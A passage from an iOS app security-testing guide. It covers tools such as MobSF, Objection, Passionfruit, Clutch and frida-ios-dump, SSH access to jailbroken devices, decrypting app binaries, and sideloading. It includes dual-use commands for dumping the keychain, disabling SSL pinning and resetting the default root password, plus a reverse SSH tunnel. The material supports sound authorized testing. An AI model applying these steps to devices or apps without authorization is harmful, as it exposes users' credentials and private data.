# Installation process
./run.sh # For Linux and Mac
run.bat # For Windows
\end{verbatim}

\begin{quote}
By running it locally on a macOS host you'll benefit from a slightly
better class-dump output.
\end{quote}

Once you have MobSF up and running you can open it in your browser by
navigating to \url{http://127.0.0.1:8000}. Simply drag the IPA you want
to analyze into the upload area and MobSF will start its job.

After MobSF is done with its analysis, you will receive a one-page
overview of all the tests that were executed. The page is split up into
multiple sections giving some first hints on the attack surface of the
application.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/a70d91db8c881c205f3831ecfd5d5432ce6c4610.png}
\caption{MobSF for iOS}
\end{figure}

The following is displayed:

\begin{itemize}
\tightlist
\item
  Basic information about the app and its binary file.
\item
  Some options to:

  \begin{itemize}
  \tightlist
  \item
    View the \texttt{Info.plist} file.
  \item
    View the strings contained in the app binary.
  \item
    Download a class-dump, if the app was written in Objective-C; if it
    is written in Swift no class-dump can be created.
  \end{itemize}
\item
  List all Purpose Strings extracted from the \texttt{Info.plist} which
  give some hints on the app's permissions.
\item
  Exceptions in the App Transport Security (ATS) configuration will be
  listed.
\item
  A brief binary analysis showing if free binary security features are
  activated or e.g.~if the binary makes use of banned APIs.
\item
  List of libraries used by the app binary and list of all files inside
  the unzipped IPA.
\end{itemize}

\begin{quote}
In contrast to the Android use case, MobSF does not offer any dynamic
analysis features for iOS apps.
\end{quote}

Refer to \href{https://mobsf.github.io/docs}{MobSF documentation} for
more details.

\hypertarget{needle}{%
\subparagraph{Needle}\label{needle}}

\href{https://github.com/mwrlabs/needle}{Needle} is an all-in-one iOS
security assessment framework, which you can compare to as a
``Metasploit'' for iOS. The
\href{https://github.com/mwrlabs/needle/wiki/Installation-Guide}{installation
guide} in the Github wiki contains all the information needed on how to
prepare your Kali Linux or macOS and how to install the Needle Agent on
your iOS device.

Please also ensure that you install the Darwin CC Tools from the
Coolstar repository, to get Needle to work on iOS 12.

In order to configure Needle read the
\href{https://github.com/mwrlabs/needle/wiki/Quick-Start-Guide}{Quick
Start Guide} and go through the
\href{https://github.com/mwrlabs/needle/wiki/Command-Reference}{Command
Reference of Needle} to get familiar with it.

\begin{quote}
There are known issues with Needle when running on iOS devices that are
\href{https://github.com/mwrlabs/needle/issues/273}{jailbroken with
Chimera}. Instead, the unc0ver jailbreak should be used.
\end{quote}

\hypertarget{objection-1}{%
\subparagraph{Objection}\label{objection-1}}

\href{https://github.com/sensepost/objection}{Objection} is a ``runtime
mobile exploration toolkit, powered by Frida''. Its main goal is to
allow security testing on non-rooted or jailbroken devices through an
intuitive interface.

Objection achieves this goal by providing you with the tools to easily
inject the Frida gadget into an application by repackaging it. This way,
you can deploy the repackaged app to the non-jailbroken device by
sideloading it and interact with the application as explained in the
previous section.

However, Objection also provides a REPL that allows you to interact with
the application, giving you the ability to perform any action that the
application can perform. A full list of the features of Objection can be
found on the project's homepage, but here are a few interesting ones:

\begin{itemize}
\tightlist
\item
  Repackage applications to include the Frida gadget
\item
  Disable SSL pinning for popular methods
\item
  Access application storage to download or upload files
\item
  Execute custom Frida scripts
\item
  Dump the Keychain
\item
  Read plist files
\end{itemize}

All these tasks and more can be easily done by using the commands in
objection's REPL. For example, you can obtain the classes used in an
app, functions of classes or information about the bundles of an app by
running:

\begin{verbatim}
OWASP.iGoat-Swift on (iPhone: 12.0) [usb] # ios hooking list classes
OWASP.iGoat-Swift on (iPhone: 12.0) [usb] # ios hooking list class_methods <ClassName>
OWASP.iGoat-Swift on (iPhone: 12.0) [usb] # ios bundles list_bundles
\end{verbatim}

The ability to perform advanced dynamic analysis on non-jailbroken
devices is one of the features that makes Objection incredibly useful.
It is not always possible to jailbreak the latest version of iOS, or you
may have an application with advanced jailbreak detection mechanisms.
Furthermore, the included Frida scripts make it very easy to quickly
analyze an application, or get around basic security controls.

Finally, in case you do have access to a jailbroken device, Objection
can connect directly to the running Frida server to provide all its
functionality without needing to repackage the application.

Installing Objection

Objection can be installed through pip as described on
\href{https://github.com/sensepost/objection/wiki/Installation}{Objection's
Wiki}.

\begin{verbatim}
$ pip3 install objection
\end{verbatim}

If your device is jailbroken, you are now ready to interact with any
application running on the device and you can skip to the ``Using
Objection'' section below.

However, if you want to test on a non-jailbroken device, you will first
need to include the Frida gadget in the application. The
\href{https://github.com/sensepost/objection/wiki/Patching-iOS-Applications}{Objection
Wiki} describes the needed steps in detail, but after making the right
preparations, you'll be able to patch an IPA by calling the objection
command:

\begin{verbatim}
$ objection patchipa --source my-app.ipa --codesign-signature 0C2E8200Dxxxx
\end{verbatim}

Finally, the application needs to be sideloaded and run with debugging
communication enabled. Detailed steps can be found on the
\href{https://github.com/sensepost/objection/wiki/Running-Patched-iOS-Applications}{Objection
Wiki}, but for macOS users it can easily be done by using ios-deploy:

\begin{verbatim}
$ ios-deploy --bundle Payload/my-app.app -W -d
\end{verbatim}

Using Objection

Starting up Objection depends on whether you've patched the IPA or
whether you are using a jailbroken device running Frida-server. For
running a patched IPA, objection will automatically find any attached
devices and search for a listening frida gadget. However, when using
frida-server, you need to explicitly tell frida-server which application
you want to analyze.

\begin{verbatim}
# Connecting to a patched IPA
$ objection explore

# Using frida-ps to get the correct application name
$ frida-ps -Ua | grep -i Telegram
983  Telegram

# Connecting to the Telegram app through Frida-server
$ objection --gadget="Telegram" explore
\end{verbatim}

Once you are in the Objection REPL, you can execute any of the available
commands. Below is an overview of some of the most useful ones:

\begin{verbatim}
# Show the different storage locations belonging to the app
$ env

# Disable popular ssl pinning methods
$ ios sslpinning disable

# Dump the Keychain
$ ios keychain dump

# Dump the Keychain, including access modifiers. The result will be written to the host in myfile.json
$ ios keychain dump --json <myfile.json>

# Show the content of a plist file
$ ios plist cat <myfile.plist>
\end{verbatim}

More information on using the Objection REPL can be found on the
\href{https://github.com/sensepost/objection/wiki/Using-objection}{Objection
Wiki}

\hypertarget{passionfruit}{%
\subparagraph{Passionfruit}\label{passionfruit}}

\href{https://github.com/chaitin/passionfruit/}{Passionfruit} is an iOS
app blackbox assessment tool that is using the Frida server on the iOS
device and visualizes many standard app data via Vue.js-based GUI. It
can be installed with npm.

\begin{verbatim}
$ npm install -g passionfruit
$ passionfruit
listening on http://localhost:31337
\end{verbatim}

When you execute the command \texttt{passionfruit} a local server will
be started on port 31337. Connect your jailbroken device with the Frida
server running, or a non-jailbroken device with a repackaged app
including Frida to your macOS device via USB. Once you click on the
``iPhone'' icon you will get an overview of all installed apps:

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/fe6365453719e80590d3afce7e4cc779feb735be.png}
\caption{Passionfruit}
\end{figure}

With Passionfruit it's possible to explore different kinds of
information concerning an iOS app. Once you selected the iOS app you can
perform many tasks such as:

\begin{itemize}
\tightlist
\item
  Get information about the binary
\item
  View folders and files used by the application and download them
\item
  Inspect the Info.plist
\item
  Get a UI Dump of the app screen shown on the iOS device
\item
  List the modules that are loaded by the app
\item
  Dump class names
\item
  Dump keychain items
\item
  Access to NSLog traces
\end{itemize}

\hypertarget{radare2-3}{%
\subparagraph{Radare2}\label{radare2-3}}

\href{https://github.com/radare/radare2}{Radare2} is a complete
framework for reverse-engineering and analyzing binaries. The
installation instructions can be found in the GitHub repository. To
learn more on radare2 you may want to read the
\href{https://radare.gitbooks.io/radare2book/content/}{official radare2
book}.

\hypertarget{tableplus}{%
\subparagraph{TablePlus}\label{tableplus}}

\href{https://tableplus.io/}{TablePlus} is a tool for Windows and macOS
to inspect database files, like Sqlite and others. This can be very
useful during iOS engagements when dumping the database files from the
iOS device and analyzing the content of them with a GUI tool.

\hypertarget{basic-testing-operations-1}{%
\subsubsection{Basic Testing
Operations}\label{basic-testing-operations-1}}

\hypertarget{accessing-the-device-shell-1}{%
\paragraph{Accessing the Device
Shell}\label{accessing-the-device-shell-1}}

One of the most common things you do when testing an app is accessing
the device shell. In this section we'll see how to access the iOS shell
both remotely from your host computer with/without a USB cable and
locally from the device itself.

\hypertarget{remote-shell-1}{%
\subparagraph{Remote Shell}\label{remote-shell-1}}

In contrast to Android where you can easily access the device shell
using the adb tool, on iOS you only have the option to access the remote
shell via SSH. This also means that your iOS device must be jailbroken
in order to connect to its shell from your host computer. For this
section we assume that you've properly jailbroken your device and have
either Cydia (see screenshot above) or Sileo installed as explained in
``Getting Privileged Access''. In the rest of the guide we will
reference to Cydia, but the same packages should be available in Sileo.

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/941c3323ce1e22f1181dbd2b8ebcd856dd4552a7.png}
\caption{iOS App Folder Structure}
\end{figure}

In order to enable SSH access to your iOS device you can install the
OpenSSH package. Once installed, be sure to connect both devices to the
same Wi-Fi network and take a note of the device IP address, which you
can find in the Settings -\textgreater{} Wi-Fi menu and tapping once on
the info icon of the network you're connected to.

You can now access the remote device's shell by running
\texttt{ssh\ root@\textless{}device\_ip\_address\textgreater{}}, which
will log you in as the root user:

\begin{verbatim}
$ ssh root@192.168.197.234
root@192.168.197.234's password:
iPhone:~ root#
\end{verbatim}

Press Control + D or type \texttt{exit} to quit.

When accessing your iOS device via SSH consider the following:

\begin{itemize}
\tightlist
\item
  The default users are \texttt{root} and \texttt{mobile}.
\item
  The default password for both is \texttt{alpine}.
\end{itemize}

\begin{quote}
Remember to change the default password for both users \texttt{root} and
\texttt{mobile} as anyone on the same network can find the IP address of
your device and connect via the well-known default password, which will
give them root access to your device.
\end{quote}

If you forget your password and want to reset it to the default
\texttt{alpine}:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Edit the file \texttt{/private/etc/master.password} on your jailbroken
  iOS device (using an on-device shell as shown below)
\item
  Find the lines:

\begin{verbatim}
 root:xxxxxxxxx:0:0::0:0:System Administrator:/var/root:/bin/sh
 mobile:xxxxxxxxx:501:501::0:0:Mobile User:/var/mobile:/bin/sh
\end{verbatim}
\item
  Change \texttt{xxxxxxxxx} to \texttt{/smx7MYTQIi2M} (which is the
  hashed password \texttt{alpine})
\item
  Save and exit
\end{enumerate}

Connect to a Device via SSH over USB

During a real black box test, a reliable Wi-Fi connection may not be
available. In this situation, you can use
\href{https://github.com/libimobiledevice/usbmuxd}{usbmuxd} to connect
to your device's SSH server via USB.

Usbmuxd is a socket daemon that monitors USB iPhone connections. You can
use it to map the mobile device's localhost listening sockets to TCP
ports on your host machine. This allows you to conveniently SSH into
your iOS device without setting up an actual network connection. When
usbmuxd detects an iPhone running in normal mode, it connects to the
phone and begins relaying requests that it receives via
\texttt{/var/run/usbmuxd}.

Connect macOS to an iOS device by installing and starting iproxy:

\begin{verbatim}
$ brew install libimobiledevice
$ iproxy 2222 22
waiting for connection
\end{verbatim}

The above command maps port \texttt{22} on the iOS device to port
\texttt{2222} on localhost. You can also
\href{https://iphonedevwiki.net/index.php/SSH_Over_USB}{make iproxy run
automatically in the background} if you don't want to run the binary
every time you want to SSH over USB.

With the following command in a new terminal window, you can connect to
the device:

\begin{verbatim}
$ ssh -p 2222 root@localhost
root@localhost's password:
iPhone:~ root#
\end{verbatim}

You can also connect to your iPhone's USB via
\href{https://labs.mwrinfosecurity.com/blog/needle-how-to/}{Needle}.

\hypertarget{on-device-shell-app-1}{%
\subparagraph{On-device Shell App}\label{on-device-shell-app-1}}

While usually using an on-device shell (terminal emulator) might be very
tedious compared to a remote shell, it can prove handy for debugging in
case of, for example, network issues or check some configuration. For
example, you can install
\href{https://repo.chariz.io/package/ws.hbang.newterm2/}{NewTerm 2} via
Cydia for this purpose (it supports iOS 6.0 to 12.1.2 at the time of
this writing).

In addition, there are a few jailbreaks that explicitly disable incoming
SSH \emph{for security reasons}. In those cases, it is very convenient
to have an on-device shell app, which you can use to first SSH out of
the device with a reverse shell, and then connect from your host
computer to it.

Opening a reverse shell over SSH can be done by running the command
\texttt{ssh\ -R\ \textless{}remote\_port\textgreater{}:localhost:22\ \textless{}username\textgreater{}@\textless{}host\_computer\_ip\textgreater{}}.

On the on-device shell app run the following command and, when asked,
enter the password of the \texttt{mstg} user of the host computer:

\begin{verbatim}
ssh -R 2222:localhost:22 mstg@192.168.197.235
\end{verbatim}

On your host computer run the following command and, when asked, enter
the password of the \texttt{root} user of the iOS device:

\begin{verbatim}
$ ssh -p 2222 root@localhost
\end{verbatim}

\hypertarget{host-device-data-transfer-1}{%
\paragraph{Host-Device Data
Transfer}\label{host-device-data-transfer-1}}

There might be various scenarios where you might need to transfer data
from the iOS device or app data sandbox to your workstation or vice
versa. The following section will show you different ways on how to
achieve that.

\hypertarget{copying-app-data-files-via-ssh-and-scp}{%
\subparagraph{Copying App Data Files via SSH and
SCP}\label{copying-app-data-files-via-ssh-and-scp}}

As we know now, files from our app are stored in the Data directory. You
can now simply archive the Data directory with \texttt{tar} and pull it
from the device with \texttt{scp}:

\begin{verbatim}
iPhone:~ root# tar czvf /tmp/data.tgz /private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693
iPhone:~ root# exit
$ scp -P 2222 root@localhost:/tmp/data.tgz .
\end{verbatim}

\hypertarget{passionfruit-1}{%
\subparagraph{Passionfruit}\label{passionfruit-1}}

After starting Passionfruit you can select the app that is in scope for
testing. There are various functions available, of which one is called
``Files''. When selecting it, you will get a listing of the directories
of the app sandbox.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/7d582611b62d36df15e2e70aa59f9b3edb63ceb5.png}
\caption{Passiofruit Data directory}
\end{figure}

When navigating through the directories and selecting a file, a pop-up
will show up and display the data either as hexadecimal or text. When
closing this pop-up you have various options available for the file,
including:

\begin{itemize}
\tightlist
\item
  Text viewer
\item
  SQLite viewer
\item
  Image viewer
\item
  Plist viewer
\item
  Download
\end{itemize}

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/47ac539e21259f375afeadf39e3185e10750e8d0.png}
\caption{Passionfruit File Options}
\end{figure}

\hypertarget{objection-2}{%
\subparagraph{Objection}\label{objection-2}}

When you are starting objection you will find the prompt within the
Bundle directory.

\begin{verbatim}
org.owasp.MSTG on (iPhone: 10.3.3) [usb] # pwd print
Current directory: /var/containers/Bundle/Application/DABF849D-493E-464C-B66B-B8B6C53A4E76/org.owasp.MSTG.app
\end{verbatim}

Use the \texttt{env} command to get the directories of the app and
navigate to the Documents directory.

\begin{verbatim}
org.owasp.MSTG on (iPhone: 10.3.3) [usb] # cd /var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Documents
/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Documents
\end{verbatim}

With the command
\texttt{file\ download\ \textless{}filename\textgreater{}} you can
download a file from the iOS device to your workstation and can analyze
it afterwards.

\begin{verbatim}
org.owasp.MSTG on (iPhone: 10.3.3) [usb] # file download .com.apple.mobile_container_manager.metadata.plist
Downloading /var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.metadata.plist to .com.apple.mobile_container_manager.metadata.plist
Streaming file from device...
Writing bytes to destination...
Successfully downloaded /var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.metadata.plist to .com.apple.mobile_container_manager.metadata.plist
\end{verbatim}

You can also upload files to the iOS device with
\texttt{file\ upload\ \textless{}local\_file\_path\textgreater{}}.

\hypertarget{obtaining-and-extracting-apps-1}{%
\paragraph{Obtaining and Extracting
Apps}\label{obtaining-and-extracting-apps-1}}

\hypertarget{getting-the-ipa-file-from-an-ota-distribution-link}{%
\subparagraph{Getting the IPA File from an OTA Distribution
Link}\label{getting-the-ipa-file-from-an-ota-distribution-link}}

During development, apps are sometimes provided to testers via
over-the-air (OTA) distribution. In that situation, you'll receive an
itms-services link, such as the following:

\begin{verbatim}
itms-services://?action=download-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist
\end{verbatim}

You can use the \href{https://www.npmjs.com/package/itms-services}{ITMS
services asset downloader} tool to download the IPA from an OTA
distribution URL. Install it via npm:

\begin{verbatim}
$ npm install -g itms-services
\end{verbatim}

Save the IPA file locally with the following command:

\begin{verbatim}
# itms-services -u "itms-services://?action=download-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist" -o - > out.ipa
\end{verbatim}

\hypertarget{acquiring-the-app-binary}{%
\subparagraph{Acquiring the App Binary}\label{acquiring-the-app-binary}}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  From an IPA:

  If you have the IPA (probably including an already decrypted app
  binary), unzip it and you are ready to go. The app binary is located
  in the main bundle directory (.app),
  e.g.~\texttt{Payload/Telegram\ X.app/Telegram\ X}. See the following
  subsection for details on the extraction of the property lists.

  \begin{quote}
  On macOS's Finder, .app directories are opened by right-clicking them
  and selecting ``Show Package Content''. On the terminal you can just
  \texttt{cd} into them.
  \end{quote}
\item
  From a Jailbroken device:

  If you don't have the original IPA, then you need a jailbroken device
  where you will install the app (e.g.~via App Store). Once installed,
  you need to extract the app binary from memory and rebuild the IPA
  file. Because of DRM, the file is encrypted when it is stored on the
  iOS device, so simply pulling the binary from the Bundle (either
  through SSH or Objection) will not be successful. The following shows
  the output of running class-dump on the Telegram app, which was
  directly pulled from the installation directory of the iPhone:
\end{enumerate}

\begin{verbatim}
$ class-dump Telegram
//
//     Generated by class-dump 3.5 (64 bit) (Debug version compiled Jun  9 2015 22:53:21).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2014 by Steve Nygard.
//

#pragma mark -

//
// File: Telegram
// UUID: EAF90234-1538-38CF-85B2-91A84068E904
//
//                           Arch: arm64
//                 Source version: 0.0.0.0.0
//            Minimum iOS version: 8.0.0
//                    SDK version: 12.1.0
//
// Objective-C Garbage Collection: Unsupported
//
//                       Run path: @executable_path/Frameworks
//                               = /Frameworks
//         This file is encrypted:
//                                   cryptid: 0x00000001
//                                  cryptoff: 0x00004000
//                                 cryptsize: 0x000fc000
//
\end{verbatim}

In order to retrieve the unencrypted version, we can use tools such as
\href{https://github.com/AloneMonkey/frida-ios-dump}{frida-ios-dump} or
\href{https://github.com/KJCracks/Clutch}{Clutch}. Both will extract the
unencrypted version from memory while the application is running on the
device. The stability of both Clutch and Frida can vary depending on
your iOS version and Jailbreak method, so it's useful to have multiple
ways of extracting the binary. In general, all iOS versions lower than
12 should work with Clutch, while iOS 12+ should work with
frida-ios-dump or a modified version of Clutch as discussed later.

Using Clutch

After building Clutch as explained on the Clutch GitHub page, push it to
the iOS device through SCP. Run Clutch with the \texttt{-i} flag to list
all installed applications:

\begin{verbatim}
root# ./Clutch -i
2019-06-04 20:16:57.807 Clutch[2449:440427] command: Prints installed applications
Installed apps:
...
5:   Telegram Messenger <ph.telegra.Telegraph>
...
\end{verbatim}

Once you have the bundle identifier, you can use Clutch to create the
IPA:

\begin{verbatim}
root# ./Clutch -d ph.telegra.Telegraph
2019-06-04 20:19:28.460 Clutch[2450:440574] command: Dump specified bundleID into .ipa file
ph.telegra.Telegraph contains watchOS 2 compatible application. It's not possible to dump watchOS 2 apps with Clutch (null) at this moment.
Zipping Telegram.app
2019-06-04 20:19:29.825 clutch[2465:440618] command: Only dump binary files from specified bundleID
...
Successfully dumped framework TelegramUI!
Zipping WebP.framework
Zipping NotificationContent.appex
Zipping NotificationService.appex
Zipping Share.appex
Zipping SiriIntents.appex
Zipping Widget.appex
DONE: /private/var/mobile/Documents/Dumped/ph.telegra.Telegraph-iOS9.0-(Clutch-(null)).ipa
Finished dumping ph.telegra.Telegraph in 20.5 seconds
\end{verbatim}

After copying the IPA file over to the host system and unzipping it, you
can see that the Telegram application can now be parsed by class-dump,
indicating that it is no longer encrypted:

\begin{verbatim}
$ class-dump Telegram
...
//
//     Generated by class-dump 3.5 (64 bit) (Debug version compiled Jun  9 2015 22:53:21).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2014 by Steve Nygard.
//

#pragma mark Blocks

typedef void (^CDUnknownBlockType)(void); // return type and parameters are unknown

#pragma mark Named Structures

struct CGPoint {
    double _field1;
    double _field2;
};
...
\end{verbatim}

Note: when you use Clutch on iOS 12, please check
\href{https://github.com/KJCracks/Clutch/issues/228}{Clutch Github issue
228}

Using Frida-ios-dump

\href{https://github.com/AloneMonkey/frida-ios-dump}{Frida-ios-dump} is
a Python script that helps you retrieve the decrypted version of an iOS
app from an iOS device. It supports both Python 2 and Python 3 and
requires Frida running on your iOS device (jailbroken or not). This tool
uses Frida's
\href{https://www.frida.re/docs/javascript-api/\#memory}{Memory API} to
dump the memory of the running app and recreate an IPA file. Because the
code is extracted from memory, it is automatically decrypted.

First, make sure that the configuration in \texttt{dump.py} is set to
either localhost with port 2222 when using iProxy, or to the actual IP
address and port of the device from which you want to dump the binary.
Next, change the default username
(\texttt{User\ =\ \textquotesingle{}root\textquotesingle{}}) and
password
(\texttt{Password\ =\ \textquotesingle{}alpine\textquotesingle{}}) in
\texttt{dump.py} to the ones you use.

Now you can safely use the tool to enumerate the apps installed:

\begin{verbatim}
$ python dump.py -l
 PID  Name             Identifier
----  ---------------  -------------------------------------
 860  Cydia            com.saurik.Cydia
1130  Settings         com.apple.Preferences
 685  Mail             com.apple.mobilemail
 834  Telegram         ph.telegra.Telegraph
   -  Stocks           com.apple.stocks
   ...
\end{verbatim}

and you can dump one of the listed binaries:

\begin{verbatim}
$ python dump.py ph.telegra.Telegraph

Start the target app ph.telegra.Telegraph
Dumping Telegram to /var/folders/qw/gz47_8_n6xx1c_lwq7pq5k040000gn/T
[frida-ios-dump]: HockeySDK.framework has been loaded.
[frida-ios-dump]: Load Postbox.framework success.
[frida-ios-dump]: libswiftContacts.dylib has been dlopen.
...
start dump /private/var/containers/Bundle/Application/14002D30-B113-4FDF-BD25-1BF740383149/Telegram.app/Frameworks/libswiftsimd.dylib
libswiftsimd.dylib.fid: 100%|██████████| 343k/343k [00:00<00:00, 1.54MB/s]
start dump /private/var/containers/Bundle/Application/14002D30-B113-4FDF-BD25-1BF740383149/Telegram.app/Frameworks/libswiftCoreData.dylib
libswiftCoreData.dylib.fid: 100%|██████████| 82.5k/82.5k [00:00<00:00, 477kB/s]
5.m4a: 80.9MB [00:14, 5.85MB/s]
0.00B [00:00, ?B/s]Generating "Telegram.ipa"
\end{verbatim}

After this, the \texttt{Telegram.ipa} file will be created in your
current directory. You can validate the success of the dump by removing
the app and reinstalling it (e.g.~using
\texttt{ios-deploy\ -b\ Telegram.ipa}). Note that this will only work on
jailbroken devices, as otherwise the signature won't be valid.

\hypertarget{installing-apps-1}{%
\paragraph{Installing Apps}\label{installing-apps-1}}

When you install an application without using Apple's App Store, this is
called sideloading. There are various ways of sideloading which are
described below. On the iOS device, the actual installation process is
then handled by the installd daemon, which will unpack and install the
application. To integrate app services or be installed on an iOS device,
all applications must be signed with a certificate issued by Apple. This
means that the application can be installed only after successful code
signature verification. On a jailbroken phone, however, you can
circumvent this security feature with
\href{http://repo.hackyouriphone.org/appsyncunified}{AppSync}, a package
available in the Cydia store. It contains numerous useful applications
that leverage jailbreak-provided root privileges to execute advanced
functionality. AppSync is a tweak that patches installd, allowing the
installation of fake-signed IPA packages.

Different methods exist for installing an IPA package onto an iOS
device, which are described in detail below.

\begin{quote}
Please note that iTunes is no longer available in macOS Catalina. If you
are using an older version of macOS, iTunes is still available but since
iTunes 12.7 it is not possible to install apps.
\end{quote}

\hypertarget{cydia-impactor}{%
\subparagraph{Cydia Impactor}\label{cydia-impactor}}

\href{http://www.cydiaimpactor.com/}{Cydia Impactor} was originally
created to jailbreak iPhones, but has been rewritten to sign and install
IPA packages to iOS devices via sideloading (and even APK files to
Android devices). Cydia Impactor is available for Windows, macOS and
Linux. A
\href{https://yalujailbreak.net/how-to-use-cydia-impactor/}{step by step
guide and troubleshooting steps are available on yalujailbreak.net}.

\hypertarget{libimobiledevice}{%
\subparagraph{libimobiledevice}\label{libimobiledevice}}

On Linux and also macOS, you can alternatively use
\href{https://www.libimobiledevice.org/}{libimobiledevice}, a
cross-platform software protocol library and a set of tools for native
communication with iOS devices. This allows you to install apps over a
USB connection by executing ideviceinstaller. The connection is
implemented with the USB multiplexing daemon
\href{https://www.theiphonewiki.com/wiki/Usbmux}{usbmuxd}, which
provides a TCP tunnel over USB.

The package for libimobiledevice will be available in your Linux package
manager. On macOS you can install libimobiledevice via brew:

\begin{verbatim}
$ brew install libimobiledevice
\end{verbatim}

After the installation you have several new command line tools
available, such as \texttt{ideviceinfo}, \texttt{ideviceinstaller} or
\texttt{idevicedebug}.

\begin{verbatim}
# The following command will show detailed information about the iOS device connected via USB.
$ ideviceinfo
# The following command will install the IPA to your iOS device.
$ ideviceinstaller -i iGoat-Swift_v1.0-frida-codesigned.ipa
WARNING: could not locate iTunesMetadata.plist in archive!
WARNING: could not locate Payload/iGoat-Swift.app/SC_Info/iGoat-Swift.sinf in archive!
Copying 'iGoat-Swift_v1.0-frida-codesigned.ipa' to device... DONE.
Installing 'OWASP.iGoat-Swift'
Install: CreatingStagingDirectory (5%)
Install: ExtractingPackage (15%)
Install: InspectingPackage (20%)
Install: TakingInstallLock (20%)
Install: PreflightingApplication (30%)
Install: InstallingEmbeddedProfile (30%)
Install: VerifyingApplication (40%)
Install: CreatingContainer (50%)
Install: InstallingApplication (60%)
Install: PostflightingApplication (70%)
Install: SandboxingApplication (80%)
Install: GeneratingApplicationMap (90%)
Install: Complete
# The following command will start the app in debug mode, by providing the bundle name. The bundle name can be found in the previous command after "Installing".
$ idevicedebug -d run OWASP.iGoat-Swift
\end{verbatim}

\hypertarget{ipainstaller}{%
\subparagraph{ipainstaller}\label{ipainstaller}}

The IPA can also be directly installed on the iOS device via the command
line with \href{https://github.com/autopear/ipainstaller}{ipainstaller}.
After copying the file over to the device, for example via scp, you can
execute the ipainstaller with the IPA's filename:

\begin{verbatim}
$ ipainstaller App_name.ipa
\end{verbatim}

\hypertarget{ios-deploy-1}{%
\subparagraph{ios-deploy}\label{ios-deploy-1}}

On macOS one more tool can be used on the command line called
\href{https://github.com/ios-control/ios-deploy}{ios-deploy}, to allow
installation and debugging of iOS apps from the command line. It can be
installed via brew:

\begin{verbatim}
$ brew install ios-deploy
\end{verbatim}

After the installation, go into the directory of the IPA you want to
install and unzip it as ios-deploy installs an app by using the bundle.

\begin{verbatim}
$ unzip Name.ipa
$ ios-deploy --bundle 'Payload/Name.app' -W -d -v
\end{verbatim}

After the app is installed on the iOS device, you can simply start it by
adding the \texttt{-m} flag which will directly start debugging without
installing the application again.

\begin{verbatim}
$ ios-deploy --bundle 'Payload/Name.app' -W -d -v -m
\end{verbatim}

\hypertarget{xcode}{%
\subparagraph{Xcode}\label{xcode}}

It is also possible to use the Xcode IDE to install iOS apps by doing
the following steps:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Start Xcode
\item
  Select \textbf{Window/Devices and Simulators}
\item
  Select the connected iOS device and click on the \textbf{+} sign in
  \textbf{Installed Apps}.
\end{enumerate}

\hypertarget{allow-application-installation-on-a-non-ipad-device}{%
\subparagraph{Allow Application Installation on a Non-iPad
Device}\label{allow-application-installation-on-a-non-ipad-device}}

Sometimes an application can require to be used on an iPad device. If
you only have iPhone or iPod touch devices then you can force the
application to accept to be installed and used on these kinds of
devices. You can do this by changing the value of the property
\textbf{UIDeviceFamily} to the value \textbf{1} in the
\textbf{Info.plist} file.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<?xml}\NormalTok{ version="1.0" encoding="UTF{-}8"}\KeywordTok{?>}
\DataTypeTok{<!DOCTYPE }\NormalTok{plist PUBLIC "{-}//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList{-}1.0.dtd"}\DataTypeTok{>}
\KeywordTok{<plist}\OtherTok{ version=}\StringTok{"1.0"}\KeywordTok{>}
\KeywordTok{<dict>}

  \KeywordTok{<key>}\NormalTok{UIDeviceFamily}\KeywordTok{</key>}
  \KeywordTok{<array>}
    \KeywordTok{<integer>}\NormalTok{1}\KeywordTok{</integer>}
  \KeywordTok{</array>}

\KeywordTok{</dict>}
\KeywordTok{</plist>}  
\end{Highlighting}
\end{Shaded}

It is important to note that changing this value will break the original
signature of the IPA file so you need to re-sign the IPA, after the
update, in order to install it on a device on which the signature
validation has not been disabled.

This bypass might not work if the application requires capabilities that
are specific to modern iPads while your iPhone or iPod is a bit older.

Possible values for the property
\href{https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html\#//apple_ref/doc/uid/TP40009252-SW11}{UIDeviceFamily}
can be found in the Apple Developer documentation.

\hypertarget{information-gathering-2}{%
\paragraph{Information Gathering}\label{information-gathering-2}}

One fundamental step when analyzing apps is information gathering. This
can be done by inspecting the app package on your workstation or
remotely by accessing the app data on the device. You'll find more
advance techniques in the subsequent chapters but, for now, we will
focus on the basics: getting a list of all installed apps, exploring the
app package and accessing the app data directories on the device itself.
This should give you a bit of context about what the app is all about
without even having to reverse engineer it or perform more advanced
analysis. We will be answering questions such as:

\begin{itemize}
\tightlist
\item
  Which files are included in the package?
\item
  Which Frameworks does the app use?
\item
  Which capabilities does the app require?
\item
  Which permissions does the app request to the user and for what
  reason?
\item
  Does the app allow any unsecured connections?
\item
  Does the app create any new files when being installed?
\end{itemize}

\hypertarget{listing-installed-apps-1}{%
\subparagraph{Listing Installed Apps}\label{listing-installed-apps-1}}

When targeting apps that are installed on the device, you'll first have
to figure out the correct bundle identifier of the application you want
to analyze. You can use \texttt{frida-ps\ -Uai} to get all apps
(\texttt{-a}) currently installed (\texttt{-i}) on the connected USB
